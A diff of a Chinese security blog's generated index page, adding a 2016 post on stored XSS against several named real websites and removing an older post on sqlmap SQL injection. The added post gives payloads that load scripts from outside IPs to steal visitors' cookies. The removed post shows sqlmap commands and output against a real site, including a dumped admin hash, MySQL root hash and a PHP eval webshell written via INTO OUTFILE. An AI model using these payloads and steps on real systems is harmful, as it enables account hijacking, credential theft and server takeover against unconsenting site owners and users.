@@ -64,6 +64,60 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-xss实例" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="../../2016/07/22/xss实例/" class="article-date">
+  <time datetime="2016-07-22T07:08:13.000Z" itemprop="datePublished">2016-07-22</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="../../categories/WEB/">WEB</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="../../2016/07/22/xss实例/">xss实例</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#时光网#<br>登录之后<br>有一个我关注的话题然后<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%871.png?raw=true" alt="image"></p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%872.png?raw=true" alt="image"></p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%873.png?raw=true" alt="image"><br>并没有转换为实体编码，有xss漏洞<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%874.png?raw=true" alt="image"><br>在控制台测试函数$loadjs函数可以利用<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%875.png?raw=true" alt="image"><br>用$loadjs()函数构造payload<br><a href="http://163.44.171.86/ssss.js" target="_blank" rel="external">http://163.44.171.86/ssss.js</a></p>
+<p><a href="svg/onload=”b=’http://’163”">svg/onload=”b=’http://’163”</a></p>
+<p><svg onload="”b+=’.44.171.86’”"/></p>
+<p><svg onload="”b+=’/ssss.js’”"/></p>
+<p><svg onload="”$loadjs(b)”"><br/>查看一下有没有转换<br/><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%876.png?raw=true" alt="image"/><br/>没有转换为实体编码应该就可以了<br/>发链接给别人<br/>获取cookie<br/><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%877.png?raw=true" alt="image"/></svg></p>
+<p>#南方人物周刊xss实验报告#<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%878.png?raw=true" alt="image"><br>存在xss的点，每次加载都会弹出来<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%879.png?raw=true" alt="image"><br>查看网页源代码，发现网页有两个地方触发了js<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8710.png?raw=true" alt="image"><br>一个是标题的地方<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8711.png?raw=true" alt="image"><br>一个是会员的姓名<br>第二个对于我们来说是可以控制的，然后我们就可以利用构造payload<br>缩短前的网址<a href="http://123.206.18.223/probe.js——&gt;缩短后的网址：http://t.im/16ar4" target="_blank" rel="external">http://123.206.18.223/probe.js——&gt;缩短后的网址：http://t.im/16ar4</a><br>重新构造payload：payload：<script src="”http://t.im/16ar4”"><br>让网页加载外部服务器中构造的JS文件<br>发现有长度限制，还是不行</p>
+<p>#唯宝网#</p>
+<p>发现在写日记哪里存在xss<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8712.png?raw=true" alt="image"><br>于是我换成获取饼干的js代码”/&gt;<script src='http://115.159.126.186/x.js'></script>  并在源码中插入有效成功</p>
+<p>中兴论坛<br>发帖哪里存在xss<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8713.png?raw=true" alt="image"><br>然后抓包<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8714.png?raw=true" alt="image"><br>在我的444后面写上服务器的网址</p>
+<p><script src="http://163.44.171.86/ssss.js"></script><br>获取到cookie的信息<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8715.png?raw=true" alt="image"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/07/22/xss实例/" data-id="cirh53cq70012achrp11a8cih" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/xss/">xss</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-xss的挖掘和利用" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="../../2016/07/18/xss的挖掘和利用/" class="article-date">
@@ -125,7 +179,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/18/xss的挖掘和利用/" data-id="cirh492ag0016cghringijk8l" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/18/xss的挖掘和利用/" data-id="cirh53cqm001aachr0do8chcx" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/xss/">xss</a></li></ul>
@@ -178,7 +232,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/18/google-hacking/" data-id="cirh4928a0007cghr0mka3nqd" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/18/google-hacking/" data-id="cirh53co10005achrr9ivxy0z" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/google/">google</a></li></ul>
@@ -232,7 +286,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/16/centos配置nginx-php/" data-id="cirh4927v0001cghr776fvsaq" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/16/centos配置nginx-php/" data-id="cirh53csd0025achrj1m6j90r" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/centos/">centos</a></li></ul>
@@ -277,7 +331,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/15/csrf漏洞发掘和利用/" data-id="cirh4928a0005cghreohjbh06" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/15/csrf漏洞发掘和利用/" data-id="cirh53cnl0001achr31tlv9yl" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/csrf/">csrf</a></li></ul>
@@ -350,7 +404,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/13/sql注入步骤/" data-id="cirh492a1000wcghr21kgp989" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/13/sql注入步骤/" data-id="cirh53cpr000zachrvz2wqwh8" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/sql注入/">sql注入</a></li></ul>
@@ -393,7 +447,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/07/渗透测试流程/" data-id="cirh492br001rcghrkcc1d6do" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/07/渗透测试流程/" data-id="cirh53crx001tachrzad4fqrf" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/流程/">流程</a></li></ul>
@@ -508,7 +562,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/07/sql注入之盲注/" data-id="cirh4929l000pcghrct9cy7qd" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/07/sql注入之盲注/" data-id="cirh53cpb000pachr1p136ev1" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/sql注入/">sql注入</a></li></ul>
@@ -594,7 +648,7 @@ print &quot;-------------&quot;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/06/sql注入报错注入/" data-id="cirh4929l000tcghrty87b997" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/06/sql注入报错注入/" data-id="cirh53cpr000tachr6qy1vm5z" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/sql注入/">sql注入</a></li></ul>
@@ -649,67 +703,7 @@ print &quot;-------------&quot;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/06/sql注入联合查询/" data-id="cirh492ag0013cghrg9jczj5n" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/sql注入/">sql注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sql注入之sqlmap进行mysql注入root权限" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="../../2016/07/05/sql注入之sqlmap进行mysql注入root权限/" class="article-date">
-  <time datetime="2016-07-05T10:32:52.000Z" itemprop="datePublished">2016-07-05</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="../../categories/WEB/">WEB</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="../../2016/07/05/sql注入之sqlmap进行mysql注入root权限/">sql注入之sqlmap进行mysql注入root权限</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <hr>
-<p>#注解：#<br>1.在BT5 R2下 sqlmap安装路径为root@bt:/pentest/database/sqlmap#  也可以通过启动快捷方式启动sqlmap<br>root@bt:/pentest/database/sqlmap# python sqlmap.py -u <a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a> -f -b –current-user –current-db -v 1         * 获取当前用户和当前数据库<br>返回结果 :<br>[02:42:20] [INFO] fetching current user<br>current user:    ‘root@localhost’<br>[02:42:21] [INFO] fetching current database<br>current database:    ‘wepost’<br>这一句话命令代表的意思是：python sqlmap.py -u <a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a> -f -b –current-user –current-db -v 1</p>
-<h2 id="看结果可以也可以知道-当前用户为-root-当前数据库为-wepost"><a href="#看结果可以也可以知道-当前用户为-root-当前数据库为-wepost" class="headerlink" title="看结果可以也可以知道 当前用户为 root  当前数据库为 wepost"></a>看结果可以也可以知道 当前用户为 root  当前数据库为 wepost</h2><p>2.root@bt:/pentest/database/sqlmap# python sqlmap.py -u <a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a>  –dbs -v 2                                   <em> 获取所有数据库<br>返回结果 :<br>available databases [8]:<br>[</em>] bb<br>[<em>] cart<br>[</em>] information_schema<br>[<em>] mysql<br>[</em>] taipotour<br>[<em>] test<br>[</em>] wepost<br>[*] wepost2</p>
-<h2 id="看结果可以也可以知道-当前存在8个数据库"><a href="#看结果可以也可以知道-当前存在8个数据库" class="headerlink" title="* 看结果可以也可以知道 当前存在8个数据库"></a>* 看结果可以也可以知道 当前存在8个数据库</h2><p>3.root@bt:/pentest/database/sqlmap# python sqlmap.py -u <a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a>  –tables -D wepost -v 2                     /*获取wepost数据库（也就是当前数据库）的所有表名</p>
-<p>返回结果 :<br>Database: wepost<br>[6 tables]<br>+————-+<br>| admin       |<br>| article     |<br>| contributor |<br>| idea        |<br>| image       |<br>| issue       |<br>+————-+</p>
-<h2 id="看结果可以也可以知道-存在6个表"><a href="#看结果可以也可以知道-存在6个表" class="headerlink" title="看结果可以也可以知道   存在6个表"></a>看结果可以也可以知道   存在6个表</h2><p>4.root@bt:/pentest/database/sqlmap# python sqlmap.py -u <a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a>  –columns -D wepost -T admin -v 2     /*获取wepost数据库里admin表的字段<br>返回结果 :<br>Database: wepost<br>Table: admin<br>[4 columns]<br>+———-+————-+<br>| Column   | Type        |<br>+———-+————-+<br>| id       | int(11)     |<br>| password | varchar(32) |<br>| type     | varchar(10) |<br>| userid   | varchar(20) |<br>+———-+————-+</p>
-<h2 id="看结果可以也可以知道-存在4个字段"><a href="#看结果可以也可以知道-存在4个字段" class="headerlink" title="看结果可以也可以知道   存在4个字段"></a>看结果可以也可以知道   存在4个字段</h2><p>5.root@bt:/pentest/database/sqlmap# python sqlmap.py -u <a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a> –dump  -D “wepost” -T “admin”  -C “userid,password”  -s “sqlnmapdb.log”<br>/*获取wepost数据库里 admin表里 userid和password字段里面的内容 并将数据保存下来 /pentest/database/sqlmap/output/www.wepost.com.hk<br>返回结果 :<br>Database: wepost<br>Table: admin<br>[1 entry]<br>+———————————-+————+<br>| password                         | userid     |<br>+———————————-+————+<br>| 7d4d7589db8b28e04db0982dd0e92189 | wepost2010 |<br>+———————————-+————+<br>[03:08:51] [INFO] Table ‘wepost.admin’ dumped to CSV file ‘/pentest/database/sqlmap/output/www.wepost.com.hk/dump/wepost/admin.csv’<br>[03:08:51] [INFO] Fetched data logged to text files under ‘/pentest/database/sqlmap/output/www.wepost.com.hk’<br>得到帐号密码| 7d4d7589db8b28e04db0982dd0e92189 | wepost2010 |<br>破MD5找后台去把<br>mysql既然是root权限 当然可以试着写shell或者读文件<br>（一般读都是读apache配置文件找网站路径 网站配置文件获取root密码尝试社工直接登录linux的ssh或者登录phpmyadmin登录执行sql语句写shell 或者读其他铭感信息）</p>
-<p>root权限写shell的3个条件：<br>1、知道站点物理路径<br>2、有足够大的权限（可以用select …. from mysql.user测试）<br>3、magic_quotes_gpc()=OFF<br>新版本的 php 已经将默认的值改为了 On 开启时</p>
-<p>当magic_quotes_gpc = On　时，它会将提交的变量中所有的 ‘(单引号)、”(双号号)、(反斜线)、空白字符，都为在前面自动加上 \ 进行转义<br>如何判断 :<br>1.工具穿山甲<br>2.and ‘1’=’1’<br>正常返回就是off，出错就是on<br>条件达到之后</p>
-<p>直接注入点后<br>方法1：<br><a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a> select  ‘&lt;?php eval($_POST[cmd])?&gt;’   into outfile ‘物理路径’<br>方法2：<br><a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a> and 1=2 union all select 一句话HEX值 into outfile ‘物理路径’<br>当magic_quotes_gpc = On　时 尝试读文件 读到root密码之后找phpmyadmin写shell  读linux用户<br>目标系统为2003的<br><a href="http://www.wepost.com.hk/article.php?id=276%20and%201=2%20union%20select" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276%20and%201=2%20union%20select</a> 1,2,3,4,5,@@datadir,7,8,9–<br>返回mysql路径 c:\wamp\bin\mysql\mysql5.1.36\data\mysql\user.MYD<br>补充完整的路径读取root密码</p>
-<p>6.root权限读文件<br>root@bt:/pentest/database/sqlmap# python sqlmap.py -u <a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a> –file-read “c:\wamp\bin\mysql\mysql5.1.36\data\mysql\user.MYD” -v 2<br>返回结果：<br>c:/wamp/bin/mysql/mysql5.1.36/data/mysql/user.MYD file saved to:    ‘/pentest/database/sqlmap/output/www.wepost.com.hk/files/c<strong>wamp_bin_mysql_mysql5.1.36_data_mysql_user.MYD’<br>[03:38:55] [INFO] Fetched data logged to text files under ‘/pentest/database/sqlmap/output/www.wepost.com.hk’<br>保存到了/pentest/database/sqlmap/output/www.wepost.com.hk/files/c</strong>wamp_bin_mysql_mysql5.1.36_data_mysql_user.MYD 这里了<br>root@bt:~# cd /pentest/database/sqlmap/output/www.wepost.com.hk/files/<br>root@bt:/pentest/database/sqlmap/output/www.wepost.com.hk/files# cat  c__wamp_bin_mysql_mysql5.1.36_data_mysql_user.MYD  </p>
-<h2 id="用cat查看得到的内容："><a href="#用cat查看得到的内容：" class="headerlink" title="用cat查看得到的内容："></a>用cat查看得到的内容：</h2><p>/ localhostroot/ 127.0.0.1root<br>                           %8DDA7DC67ED2CA2AD9V’h%<br>                                                                         worldgazers<em>6BB4837EB74329105EE456<br>X localhosthonoh</em>CFD1B60A4C68631E4EA4B2ABA1CBD17E301B0454root@bt:/</p>
-<hr>
-<p>用head查看到的内容：<br>root@bt:/pentest/database/sqlmap/output/www.wepost.com.hk/files# head c__wamp_bin_mysql_mysql5.1.36_data_mysql_user.MYD<br>/ localhostroot/ 127.0.0.1root<br>                           %8DDA7DC67ED2CA2AD9V’h%<br>                                                                         worldgazers<em>6BB4837EB74329105EE456<br>X localhosthonoh</em>CFD1B60A4C68631E4EA4B2ABA1CBD17E301B0454root@bt:/pentest/database/sqlmap/output/www.wepost.com.hk/files# </p>
-<p>得到40位root密码  CFD1B60A4C68631E4EA4B2ABA1CBD17E301B0454 拿去解密 之后尝试社工 或者找phpmyadmin写shell</p>
-<hr>
-<p>6.file-write写入文件到web<br>sqlmap -u <a href="http://www.123.com/test.php?cid=2" target="_blank" rel="external">http://www.123.com/test.php?cid=2</a> –file-write /localhost/mm.php –file-dest /var/www/html/xx.php -v 2</p>
-<p>?</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/05/sql注入之sqlmap进行mysql注入root权限/" data-id="cirh49296000ncghrk5hxzqpg" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/06/sql注入联合查询/" data-id="cirh53cq70015achr643iz3do" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/sql注入/">sql注入</a></li></ul>
@@ -776,6 +770,10 @@ print &quot;-------------&quot;
       <ul>
         
           <li>
+            <a href="../../2016/08/05/redis漏洞利用/">redis漏洞利用</a>
+          </li>
+        
+          <li>
             <a href="../../2016/08/05/redis的安装/">redis的安装</a>
           </li>
         
@@ -789,10 +787,6 @@ print &quot;-------------&quot;
         
           <li>
             <a href="../../2016/08/01/敏感信息泄露/">敏感信息泄露</a>
-          </li>
-        
-          <li>
-            <a href="../../2016/07/30/文件包含漏洞/">文件包含漏洞</a>
           </li>
         
       </ul>
